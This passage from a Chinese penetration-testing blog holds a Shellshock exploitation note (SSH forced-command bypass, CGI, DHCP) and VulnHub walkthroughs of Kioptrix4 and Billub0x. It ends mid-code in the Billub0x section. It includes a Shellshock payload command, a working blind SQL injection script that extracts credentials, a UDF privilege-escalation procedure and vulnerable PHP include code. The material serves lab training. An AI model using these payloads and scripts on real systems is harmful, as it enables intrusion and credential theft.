alt="image.png"><br>个人理解：forcecommand由操作系统完成，用户配置文件的command和客户端ssh链接时携带的命令属于同一类型</p></blockquote><p>接下来来看openssh提供的客户端可携带命令的功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -i identity_file <span class="hljs-built_in">test</span>@140.20.11.30 <span class="hljs-string">&#x27;echo USER=$USER and SHELL=$SHELL&#x27;</span><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;identity_file&#x27;</span>: <br>USER=<span class="hljs-built_in">test</span> and SHELL=/bin/bash<br></code></pre></td></tr></table></figure><blockquote><p>openssh允许用户在登录语句携带命令，登录成功后执行，但优先级低于两种command，即若服务端主动关闭连接就会无法执行</p></blockquote><p>漏洞产生：</p><blockquote><p>当客户端提供使用 ssh 命令运行的命令时，sshd 会将其复制到 SSH_ORIGINAL_COMMAND 变量中，但仅运行强制命令。尽管如此，由于 SSH_ORIGINAL_COMMAND 是一个<strong>环境变量</strong>，我们可以通过传递以 Bash 函数开头的命令来利用 Shellshock，这为我们提供了一种绕过施加限制的方法</p></blockquote><blockquote><p>一句话概括：登陆语句携带的命令会寄存在这个环境变量中，此时若服务器存在bashshock，即可完成shellshock所需的环境变量注入，从而执行任意命令，如反弹shell，最后获得稳定shell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405230723.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i identity_file shocker@140.20.11.30 <span class="hljs-string">&#x27;() &#123; :;&#125;; echo USER=$USER and SHELL=$SHELL&#x27;</span><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;identity_file&#x27;</span>:<br>USER=shocker and SHELL=/bin/bash<br>welcome<br></code></pre></td></tr></table></figure><blockquote><p>例题：vulnhub的tr0ll2</p></blockquote><h3 id="攻击cgi程序"><a href="#攻击cgi程序" class="headerlink" title="攻击cgi程序"></a>攻击cgi程序</h3><blockquote><p>前置知识：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405231758.png" alt="image.png"></p><blockquote><p>原理：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405231901.png" alt="image.png"></p><blockquote><p>利用条件：<br>1、启用cgi，且可以访问到cgi-bin下的cgi程序<br>2、bash版本存在shellshock</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406153231.png" alt="image.png"></p><blockquote><p>例题：vulnhub pwnos1</p></blockquote><h3 id="攻击dhcp"><a href="#攻击dhcp" class="headerlink" title="攻击dhcp"></a>攻击dhcp</h3><blockquote><p>当攻击者拿下dhcp服务器时，可攻击存在shellshock的客户机，利用114号option会作为额外option注入客户端环境变量，达成对客户端的rce</p></blockquote><blockquote><p>dhcp服务器的处理流程：</p></blockquote><ol><li><strong>DHCP Discover和Offer</strong>：<ul><li>Linux Client发送DHCP Discover报文以请求IP地址和其他网络配置信息。</li><li>DHCP服务器接收到Discover报文后，根据配置构建Offer报文，并包含IP地址、子网掩码等参数，以及额外Option中的114号参数，该参数代表Url参数，后续会被添加如环境变量。</li></ul></li><li><strong>DHCP Request和Ack</strong>：<ul><li>Linux Client接收到DHCP服务器发送的Offer报文后，可能会发送DHCP Request报文以确认所提供的网络配置。</li><li>DHCP服务器接收到Request报文后，如果同意提供配置，将发送DHCP Ack报文确认。</li><li>Linux Client在接收到Ack报文后，将配置应用到其网络接口。</li></ul></li><li><strong>Client调用Bash对端口以相关参数赋值</strong>：<ul><li>一旦Linux Client成功获得IP地址和其他网络配置，会调用Bash脚本对网络接口进行配置，并将DHCP服务器提供的参数作为环境变量传递给该脚本，其中就包括114号参数</li></ul></li></ol><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240406154553.png" alt="image.png"></p><blockquote><p>当client请求dhcp服务器时触发shellshock反弹出客户机shell</p></blockquote><h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">Bash 3.0-4.3命令执行漏洞分析 - 知道创宇 (knownsec.com)</a><br><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">Shellshock漏洞回顾与分析测试 - Debug_Orz (wooyun.js.org)</a><br><a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005">什么是ShellShock攻击？ (zhihu.com)</a><br><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园 (cnblogs.com)</a><br><a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock（软件错误） - 维基百科，自由的百科全书 — Shellshock (software bug) - Wikipedia</a><br>[ShellShock 攻击实<a href="https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/">Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌 | DEVCORE 戴夫寇爾</a><br><a href="https://developer.aliyun.com/article/473063">关于ShellShock对企业网络服务器的攻击以及防范手段-阿里云开发者社区 (aliyun.com)</a><br><a href="https://security.stackexchange.com/questions/68877/shellshock-dhcp-exploitation">bash - shellshock DHCP 漏洞利用 - 信息安全堆栈交换 — bash - shellshock dhcp exploitation - Information Security Stack Exchange</a><br><a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005">https://www.zhihu.com/tardis/zm/art/35579956?source_id=1005</a><br><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html">https://www.cnblogs.com/Cl0ud/p/14248937.html</a><br><a href="https://zhuanlan.zhihu.com/p/21365920">https://zhuanlan.zhihu.com/p/21365920</a><br> <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">https://en.wikipedia.org/wiki/Shellshock_(software_bug)</a><br><a href="https://www.freebuf.com/articles/system/279713.html">https://www.freebuf.com/articles/system/279713.html</a><br><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html</a></p>]]></content>
    
    
    <categories>
      
      <category>vuln</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Kioptrix4</title>
    <link href="/blog/vulnhub/vulnhub%20Kioptrix4/"/>
    <url>/blog/vulnhub/vulnhub%20Kioptrix4/</url>
    
    <content type="html"><![CDATA[<p>vulhub Kioptrix4 walkthrough</p><blockquote><p>关于配置只给了vmdk，无vmx，需要自建虚拟机：<br>  新建虚拟机，选择自定义模式，安装来源选择“稍后安装”，然后在客户机操作系统选择“其他”，选择位置为解压后放置vmdk文件的文件夹，设置为1核512M，一路默认，在选择磁盘处选择“使用现有虚拟磁盘”，然后选择vmdk文件，出现提示后选择“保持现有格式”。</p></blockquote><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193852.png" alt="image.png"></p><blockquote><p>开了两个smb、web、ssh</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193902.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193915.png" alt="image.png"></p><h2 id="0x02-smb渗透"><a href="#0x02-smb渗透" class="headerlink" title="0x02 smb渗透"></a>0x02 smb渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193926.png" alt="image.png"></p><blockquote><p>可以匿名访问，但是没有有效信息，先放下</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193935.png" alt="image.png"></p><blockquote><p>目录爆破发现一个数据库文件和登录页，先看sql文件：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193945.png" alt="image.png"></p><blockquote><p>创建了members表，其中有username,password,id列，插入<code>john@1234</code>的信息<br>拿john的凭据去登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402193958.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194015.png" alt="image.png"></p><blockquote><p>都登录失败，测sql注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194023.png" alt="image.png"></p><blockquote><p>mypassword处有注入点</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194032.png" alt="image.png"></p><blockquote><p>一句话可以进，随意修改name值发现cookie不会变，尝试破解cookie</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194040.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194054.png" alt="image.png"></p><blockquote><p>只能老老实实注入了</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194108.png" alt="image.png"></p><blockquote><p>存在布尔盲注</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> time  <br>url=<span class="hljs-string">&quot;http://10.10.10.137/checklogin.php&quot;</span> <span class="hljs-comment">#记得添加url  </span><br>result=<span class="hljs-string">&quot;&quot;</span>  <br>op = <span class="hljs-string">&quot;&quot;</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50000</span>):  <span class="hljs-comment">#i是长度  </span><br>    l=<span class="hljs-built_in">int</span>(<span class="hljs-number">0</span>)  <br>    r=<span class="hljs-built_in">int</span>(<span class="hljs-number">128</span>)  <br>    <span class="hljs-keyword">while</span> l&lt;r:  <br>        j=(l+r)&gt;&gt;<span class="hljs-number">1</span>  <br>        payload0=&#123;  <br>            <span class="hljs-comment">#&quot;mypassword&quot;: f&quot;&#x27; or ascii(substr(database(),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,  </span><br>            <span class="hljs-comment">#&quot;mypassword&quot;: f&quot;&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=\&quot;members\&quot;),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,            #&quot;mypassword&quot;: f&quot;&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=\&quot;members\&quot;),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,            &quot;mypassword&quot;: f&quot;&#x27; or ascii(substr((select(group_concat(id,0x7c,username,0x7c,password,0x7c))from(members)),&#123;i&#125;,1)) &gt; &#123;j&#125;#&quot;,  </span><br>            <span class="hljs-string">&quot;myusername&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,  <br>            <span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;Login&quot;</span>  <br>        &#125;  <br>        result =requests.post(url=url,data=payload0)  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;Wrong Username or Password&#x27;</span> <span class="hljs-keyword">in</span> result.text):  <br>            r=j  <br>        <span class="hljs-keyword">else</span>:  <br>            l=j+<span class="hljs-number">1</span>  <br>    op+=<span class="hljs-built_in">chr</span>(l)  <br>    <span class="hljs-built_in">print</span>(op)<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194119.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194139.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194152.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194202.png" alt="image.png"></p><blockquote><p>拿到两个凭据：</p><ol><li>john@MyNameIsJohn</li><li>robert@ADGAdsafdfwt4gadfga&#x3D;&#x3D;</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194208.png" alt="image.png"></p><blockquote><p>登录web页面好像什么用也没有，尝试ssh：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh john@10.10.10.137 -oHostKeyAlgorithms=ssh-rsa,ssh-dss <br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194222.png" alt="image.png"></p><blockquote><p>全部登录成功，一下两个shell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194236.png" alt="image.png"></p><blockquote><p>白高兴，两个全是不能用的shell<br>尝试注入写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194243.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194252.png" alt="image.png"></p><blockquote><p>反弹shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194300.png" alt="image.png"></p><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote><p>简单枚举无提权向量，且内核版本很低，考虑内核提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194319.png" alt="image.png"></p><blockquote><p>遗憾的是www-data用户无法使用wget</p></blockquote><h3 id="kshell-修补"><a href="#kshell-修补" class="headerlink" title="kshell 修补"></a>kshell 修补</h3><blockquote><p>横向回到john用户，期望这个用户可以用wget，尝试修补shell环境：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194333.png" alt="image.png"></p><blockquote><p>可用指令有echo，使用<code>echo os.system(&quot;/bin/bash&quot;)</code>修补shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194342.png" alt="image.png"></p><blockquote><p>好好好，可以确定wget是用不了了<br>查看是否有gcc</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194352.png" alt="image.png"></p><blockquote><p>没装gcc，果然可以放弃内核提权了</p></blockquote><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><blockquote><p>udf提权：上传自定义动态链接库so文件–system_exec达成命令执行，若mysql进程为root名下，则可以root身份命令执行</p></blockquote><blockquote><p>本机满足的利用条件：</p><ol><li>数据库管理员权限运行</li><li>数据库的版本信息不高于 5.5.6</li></ol></blockquote><blockquote><p>查看对内网开启的端口：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -ef | grep <span class="hljs-string">&quot;mysql&quot;</span><br>netstat -tnl<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194404.png" alt="image.png"></p><blockquote><p>尝试无密码登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194418.png" alt="image.png"></p><blockquote><p>满足提权要求，开始udf提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194429.png" alt="image.png"></p><blockquote><p>查看mysql库–func表下是否已经有可命令执行的so文件，发现已经存在，直接利用：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194449.png" alt="image.png"></p><blockquote><p>whoami回显为NULL，无须害怕直接弹shell，拿到root shell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194456.png" alt="image.png"></p><h2 id="0x05-反思补足总结"><a href="#0x05-反思补足总结" class="headerlink" title="0x05 反思补足总结"></a>0x05 反思补足总结</h2><h3 id="wget-无法执行（todo）"><a href="#wget-无法执行（todo）" class="headerlink" title="wget 无法执行（todo）"></a>wget 无法执行（todo）</h3><blockquote><p>root shell也无法运行wget</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194526.png" alt="image.png"></p><blockquote><p>不过可以使用curl -o替代</p></blockquote><h3 id="limited-shell绕过"><a href="#limited-shell绕过" class="headerlink" title="limited shell绕过"></a>limited shell绕过</h3><blockquote><ol><li><code>echo os.system(&#39;/bin/bash&#39;)</code></li></ol></blockquote><blockquote><ol start="2"><li><code>vim</code>：<br> <img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194537.png" alt="image.png"></li></ol></blockquote><blockquote><ol start="3"><li>其余手法：<a href="https://www.sans.org/blog/escaping-restricted-linux-shells/">Escaping Restricted Linux Shells</a></li></ol></blockquote><h3 id="nmap的smb用户枚举"><a href="#nmap的smb用户枚举" class="headerlink" title="nmap的smb用户枚举"></a>nmap的smb用户枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC --script=smb-enum-users 10.10.10.137<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194546.png" alt="image.png"></p><h3 id="UDF提权-1"><a href="#UDF提权-1" class="headerlink" title="UDF提权"></a>UDF提权</h3><blockquote><p>介绍：<a href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html">使用 MySQL UDF 执行命令</a></p></blockquote><blockquote><ol><li>已自带sys_exec函数：见上文</li></ol></blockquote><blockquote><ol start="2"><li>未自带需自行上传so文件： blog.csdn.net&#x2F;m0_66299232&#x2F;article&#x2F;details&#x2F;130823248 、或参照exp1518.c</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194558.png" alt="image.png"></p><blockquote><p>使用条件：</p></blockquote><ol><li>可使用的数据库账户有<code>select insert create</code>权限</li><li><code>secure_file_priv</code>为空：该参数规定了数据库可以操控的目录</li><li>数据库进程在目标(高权限)用户名下：使用UDF命令执行即用该账户命令执行</li><li>(非必要) gcc：在本机或靶机编译为so文件都可</li></ol><h3 id="使用linEnum对提权向量初步枚举"><a href="#使用linEnum对提权向量初步枚举" class="headerlink" title="使用linEnum对提权向量初步枚举"></a>使用linEnum对提权向量初步枚举</h3><blockquote><p>可完成大量基础向量枚举，但无法探测内核漏洞，故判断为内核提权时仍需跑linpeas</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194609.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194621.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194715.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240402194725.png" alt="image.png"></p><h2 id="0x06-靶机总结"><a href="#0x06-靶机总结" class="headerlink" title="0x06 靶机总结"></a>0x06 靶机总结</h2><ol><li>目录扫描：开启了smb服务、web服务、ssh服务</li><li>smb渗透：没有任何可以查看的共享文件&#x2F;目录</li><li>web渗透：通过盲注可拿到ssh登录凭据，绕过受限shell即可拿到立足点；或通过注入写马拿到www-data的立足点</li><li>提权：枚举发现mysql服务为root用户运行，且在网站配置文件拿到数据库root凭据，登录后在mysql库中发现已自带命令执行UDF函数，利用其反弹回root shell</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Billub0x</title>
    <link href="/blog/vulnhub/vulnhub%20Billub0x/"/>
    <url>/blog/vulnhub/vulnhub%20Billub0x/</url>
    
    <content type="html"><![CDATA[<p>vulhub Billub0x walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155147.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155156.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155212.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155227.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155239.png" alt="image.png"></p><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155252.png" alt="image.png"></p><blockquote><p>好像在考注入，先目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155301.png" alt="image.png"></p><blockquote><p>in.php：phpinfo</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155310.png" alt="image.png"></p><blockquote><p>add.php：文件上传</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155318.png" alt="image.png"></p><blockquote><p>test.php：任意文件下载</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155324.png" alt="image.png"></p><blockquote><p>uploaded_images：图片保存路径</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155333.png" alt="image.png"></p><blockquote><p>下载注入和文件上传页面的源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155344.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155350.png" alt="image.png"></p><blockquote><p>判断从注入下手：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));                                    <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));                                     <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;           <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);      <br></code></pre></td></tr></table></figure><blockquote><p>单引号被事先转义，注入走不通，再看文件上传<br>从源码发现没有添加action标签指向地址，是空壳页面，再换<br>这次再将目录爆破时的其他php文件全下载</p></blockquote><blockquote><p>test.php：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155358.png" alt="image.png"></p><blockquote><p>应该存在文件包含，尝试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155422.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155435.png" alt="image.png"></p><blockquote><p>shadow读不了，先放一边，看其他文件</p></blockquote><blockquote><p>in.php、show.php：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155443.png" alt="image.png"></p><blockquote><p>给一个continue参数：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155504.png" alt="image.png"></p><blockquote><p>拿到了两个user<br>再看其他文件</p></blockquote><blockquote><p>panel.php：主页面<br>页面逻辑：include对应功能页面，且参数可控</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$dir</span>=<span class="hljs-title function_ invoke__">getcwd</span>();<br><span class="hljs-variable">$choice</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>&#123;<br>       <span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>&#123;<br>        <br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>文件上传功能：检查后缀、MIME</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;upload&#x27;</span>]))<br>&#123;<br><br><span class="hljs-variable">$name</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$address</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;address&#x27;</span>]);<br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span 